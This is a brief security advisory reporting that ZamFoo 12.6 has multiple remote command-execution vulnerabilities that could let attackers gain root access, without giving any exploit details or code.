ZamFoo is prone to multiple remote command-execution vulnerabilities.

Remote attackers can exploit these issues to execute arbitrary commands within the context of the vulnerable application to gain root access. This may facilitate a complete compromise of an affected computer.

ZamFoo 12.6 is vulnerable; other versions may also be affected.
